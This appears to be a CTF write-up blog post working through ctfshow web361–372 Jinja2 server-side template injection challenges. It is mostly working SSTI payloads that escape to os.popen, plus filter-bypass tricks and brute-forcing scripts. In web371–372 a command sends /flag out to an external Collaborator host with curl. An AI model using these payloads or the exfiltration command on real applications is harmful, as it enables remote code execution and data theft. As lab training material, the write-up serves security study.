---
title: "ctfshow SSTI"
description: "Notes from working through ctfshow web361–372 (SSTI)."
publishDate: "2026-02-26T14:54:26"
tags:
  - "ctf"
  - "web"
heroImage:
  src: ../../blog/ctfshow-ssti/sea-breeze.jpg
  color: "#5D6D7E"
  alt: ctfshow SSTI
language: 'en'
draft: false
---

## web361

```text
?name={{().__class__.__base__.__subclasses__()[185].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}
```

## web362

The description says the digits 2 and 3 are filtered and `wrap_close` can't be used, but we didn't use `wrap_close` in the previous challenge, so the web361 payload still works. Alternatively, you can bypass the digit filter with an arithmetic expression, for example:

```text
__subclasses__()[11*11%2b+11]
```

## web363

Using `?name={{().__class__.__base__.__subclasses__()[185].__init__.__globals__[%27__builtins__%27]}}`, the response is `:(` once it reaches `[%27__builtins__%27]`, which shows that single and double quotes are filtered. So we switch to the `request` object:

```python
().__class__.__base__.__subclasses__()[185].__init__.__globals__[request.args.key]
```

1. **The `request` object**: a global object provided by the Flask framework that contains all the information about the current HTTP request.
2. **`.args`**: an attribute of the request object (similar to a dictionary) that stores all the parameters after the question mark in the URL.
3. **`.key`** (or `['key']`): this pulls out the value associated with key from the URL parameters.

The final payload:

```text
?name={{().__class__.__base__.__subclasses__()[185].__init__.__globals__[request.args.a][request.args.b](request.args.c)}}&a=__builtins__&b=eval&c=__import__('os').popen('cat /flag').read()
```

## web364

`args` is filtered, so you can use `request.values` or `request.cookies`:

```text
?name={{().__class__.__base__.__subclasses__()[185].__init__.__globals__[request.values.a][request.values.b](request.values.c)}}&a=__builtins__&b=eval&c=__import__('os').popen('cat /flag').read()
```

## web365

Square brackets are filtered, so you can use `__getitem__()` together with `.get()` or `pop()`.

`__getitem__()` works on `list`, `dict`, and `string`:

List: `list[0]` → `list.__getitem__(0)`

Dict: `dict['key']` → `dict.__getitem__('key')`

`get()` works on `dict`:

```python
globals().get('__builtins__')
```

`pop` works on `list`: it removes and returns the element at the given position.

```text
?name={{().__class__.__base__.__subclasses__().__getitem__(request.values.d|int).__init__.__globals__.get(request.values.a).get(request.values.b)(request.values.c)}}&a=__builtins__&b=eval&c=__import__('os').popen('cat /flag').read()&d=185
```

## web366

The underscore is filtered, so use the `attr` filter plus `request`:

```text
?name={{()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(request.values.f|int)|attr(request.values.g)|attr(request.values.h)|attr(request.values.i)(request.values.j)|attr(request.values.i)(request.values.k)(request.values.l)}}&a=__class__&b=__base__&c=__subclasses__&d=__getitem__&f=185&g=__init__&h=__globals__&i=get&j=__builtins__&k=eval&l=__import__('os').popen('cat /flag').read()
```

## web367

It looks like `os` is filtered, but that doesn't affect the web366 payload, so the previous challenge's payload gets through directly.

## web368

`request` is filtered inside `{{…}}`, so you can use `{%print(…)%}` instead.

The former mainly outputs the result of evaluating the expression inside the braces to the page.

`{% ... %}` is Jinja's statement syntax; the `print` statement used here outputs its expression.

```text
?name={%print(()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(request.values.f|int)|attr(request.values.g)|attr(request.values.h)|attr(request.values.i)(request.values.j)|attr(request.values.i)(request.values.k)(request.values.l))%}&a=__class__&b=__base__&c=__subclasses__&d=__getitem__&f=185&g=__init__&h=__globals__&i=get&j=__builtins__&k=eval&l=__import__(%27os%27).popen(%27cat%20/flag%27).read()
```

## web369

Inside `{%…%}`, `request`, `{{}}`, `os`, single and double quotes, and the underscore are all filtered.

Using `config|string|list`, you can piece the target string together character by character and join them with `~`. I also learned that `lipsum` can be used to skip the long construction chain for `builtins` from before: `lipsum`'s `__globals__` dictionary usually contains the `os` module directly, so you can just use `{{lipsum.__globals__.get('os').popen('cat /flag').read()}}` and save a big chunk of construction.

Let me write a script to dig through `config`:

```python
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://89eff3c8-d6bb-4c7e-8326-e02466997758.challenge.ctf.show/"
payload = "?name={{%print(config|string|list).pop({}).lower()%}}"
target = "__globals__"
result = ""

url = url + payload

for i in target:
    print(f"正在搜寻字符{i}")
    for j in range(0,1000):
        r = requests.get(url=url.format(j), verify=False)
        location = r.text.find("<h3>")
        word = r.text[location+4:location+5]
        if word == i.lower():
            print("(config|string|list).pop(%d).lower()  ==  %s" % (j, i))
            result += "(config|string|list).pop(%d).lower()~" % (j)
            break
print(result[:len(result) - 1])
```

```text
__globals__：//下划线被过滤
(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()
```

```text
get：
(config|string|list).pop(6).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(23).lower()
```

```text
os：//os被过滤
(config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()
```

```text
popen：
(config|string|list).pop(17).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(17).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(3).lower()
```

```text
cat /flag：//单引号被过滤
(config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()
```

```text
read:
(config|string|list).pop(18).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(20).lower()
```

Even with `lipsum` to cut down the construction length, the final payload still comes out to 1300 characters...:

```text
?name={%print(lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())|attr((config|string|list).pop(6).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(23).lower())((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower())|attr((config|string|list).pop(17).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(17).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(3).lower())((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower())|attr((config|string|list).pop(18).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(20).lower())())%}
```

## web370

Now digits are filtered too, so `pop` can't be used directly. Using the script to bypass digits via `length` or `count` makes the URL too long and causes an error, so it seems I have to switch to `set` to shorten the payload — but that's fairly cumbersome. Then I learned that half-width digits can be bypassed with full-width digits, which makes things much easier: I just need to tweak the script a bit:

```python
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def to_full_width(n):
    half = "0123456789"
    full = "０１２３４５６７８９"
    table = str.maketrans(half, full)
    return str(n).translate(table)

url = "https://72e8d189-8213-4b7f-b172-639d5521837c.challenge.ctf.show/"
payload = "?name={{%print(config|string|list).pop({}).lower()%}}"
target = "__globals__"
result = ""

for i in target:
    print(f"正在搜寻字符{i}")
    for j in range(0,1000):
        full_n = to_full_width(j)
        target_url = url + payload.format(full_n)
        r = requests.get(target_url, verify=False)
        location = r.text.find("<h3>")
        word = r.text[location+4:location+5]
        if word == i.lower():
            print("(config|string|list).pop(%s).lower()  ==  %s" % (full_n, i))
            result += "(config|string|list).pop(%s).lower()~" % (full_n)
            break
print(result[:len(result) - 1])
```

The final payload:

```text
?name={%print(lipsum|attr((config|string|list).pop(７４).lower()~(config|string|list).pop(７４).lower()~(config|string|list).pop(６).lower()~(config|string|list).pop(４１).lower()~(config|string|list).pop(２).lower()~(config|string|list).pop(３３).lower()~(config|string|list).pop(４０).lower()~(config|string|list).pop(４１).lower()~(config|string|list).pop(４２).lower()~(config|string|list).pop(７４).lower()~(config|string|list).pop(７４).lower())|attr((config|string|list).pop(６).lower()~(config|string|list).pop(１０).lower()~(config|string|list).pop(２３).lower())((config|string|list).pop(２).lower()~(config|string|list).pop(４２).lower())|attr((config|string|list).pop(１７).lower()~(config|string|list).pop(２).lower()~(config|string|list).pop(１７).lower()~(config|string|list).pop(１０).lower()~(config|string|list).pop(３).lower())((config|string|list).pop(１).lower()~(config|string|list).pop(４０).lower()~(config|string|list).pop(２３).lower()~(config|string|list).pop(７).lower()~(config|string|list).pop(２７９).lower()~(config|string|list).pop(４).lower()~(config|string|list).pop(４１).lower()~(config|string|list).pop(４０).lower()~(config|string|list).pop(６).lower())|attr((config|string|list).pop(１８).lower()~(config|string|list).pop(１０).lower()~(config|string|list).pop(４０).lower()~(config|string|list).pop(２０).lower())())%}
```

## web371

`print` is filtered, so there's no echo back — which left me stumped. From searching online, I learned that an out-of-band attack is needed. Also, the construction for `__globals__` doesn't have to be so tedious: joining a `dict` with `join` plus `set` can shorten the payload a lot, so you only need to construct the underscore. Everyone online seems to just assume up front that the underscore is at `()|select|string|list).pop(24)`, which apparently comes from the earlier challenges. As for executing a command when single quotes are filtered, the whole thing has to be constructed. You can use Burp's Collaborator tool to carry out the out-of-band attack:

```bash
curl -X POST -F xx=@/flag http://738jcw7deln9uxgsurd06339a0gr4hs6.oastify.com
```

```text
?name=
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(２４)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set ohs=(dict(o=a,s=a)|join)%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd=chr(９９)%2bchr(１１７)%2bchr(１１４)%2bchr(１０８)%2bchr(３２)%2bchr(４５)%2bchr(８８)%2bchr(３２)%2bchr(８０)%2bchr(７９)%2bchr(８３)%2bchr(８４)%2bchr(３２)%2bchr(４５)%2bchr(７０)%2bchr(３２)%2bchr(１２０)%2bchr(１２０)%2bchr(６１)%2bchr(６４)%2bchr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%2bchr(３２)%2bchr(１０４)%2bchr(１１６)%2bchr(１１６)%2bchr(１１２)%2bchr(５８)%2bchr(４７)%2bchr(４７)%2bchr(５５)%2bchr(５１)%2bchr(５６)%2bchr(１０６)%2bchr(９９)%2bchr(１１９)%2bchr(５５)%2bchr(１００)%2bchr(１０１)%2bchr(１０８)%2bchr(１１０)%2bchr(５７)%2bchr(１１７)%2bchr(１２０)%2bchr(１０３)%2bchr(１１５)%2bchr(１１７)%2bchr(１１４)%2bchr(１００)%2bchr(４８)%2bchr(５４)%2bchr(５１)%2bchr(５１)%2bchr(５７)%2bchr(９７)%2bchr(４８)%2bchr(１０３)%2bchr(１１４)%2bchr(５２)%2bchr(１０４)%2bchr(１１５)%2bchr(５４)%2bchr(４６)%2bchr(１１１)%2bchr(９７)%2bchr(１１５)%2bchr(１１６)%2bchr(１０５)%2bchr(１０２)%2bchr(１２１)%2bchr(４６)%2bchr(９９)%2bchr(１１１)%2bchr(１０９)%}
{% if ((lipsum|attr(glo)).get(ohs).popen(cmd))%}
abc
{% endif %}
```

## web372

`count` is filtered, but the previous challenges all used full-width digits, so it makes no difference; if all else fails, you can still use `length`.

```text
?name=
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(２４)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set ohs=(dict(o=a,s=a)|join)%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd=chr(９９)%2bchr(１１７)%2bchr(１１４)%2bchr(１０８)%2bchr(３２)%2bchr(４５)%2bchr(８８)%2bchr(３２)%2bchr(８０)%2bchr(７９)%2bchr(８３)%2bchr(８４)%2bchr(３２)%2bchr(４５)%2bchr(７０)%2bchr(３２)%2bchr(１２０)%2bchr(１２０)%2bchr(６１)%2bchr(６４)%2bchr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%2bchr(３２)%2bchr(１０４)%2bchr(１１６)%2bchr(１１６)%2bchr(１１２)%2bchr(５８)%2bchr(４７)%2bchr(４７)%2bchr(５５)%2bchr(５１)%2bchr(５６)%2bchr(１０６)%2bchr(９９)%2bchr(１１９)%2bchr(５５)%2bchr(１００)%2bchr(１０１)%2bchr(１０８)%2bchr(１１０)%2bchr(５７)%2bchr(１１７)%2bchr(１２０)%2bchr(１０３)%2bchr(１１５)%2bchr(１１７)%2bchr(１１４)%2bchr(１００)%2bchr(４８)%2bchr(５４)%2bchr(５１)%2bchr(５１)%2bchr(５７)%2bchr(９７)%2bchr(４８)%2bchr(１０３)%2bchr(１１４)%2bchr(５２)%2bchr(１０４)%2bchr(１１５)%2bchr(５４)%2bchr(４６)%2bchr(１１１)%2bchr(９７)%2bchr(１１５)%2bchr(１１６)%2bchr(１０５)%2bchr(１０２)%2bchr(１２１)%2bchr(４６)%2bchr(９９)%2bchr(１１１)%2bchr(１０９)%}
{% if ((lipsum|attr(glo)).get(ohs).popen(cmd))%}
abc
{% endif %}
```
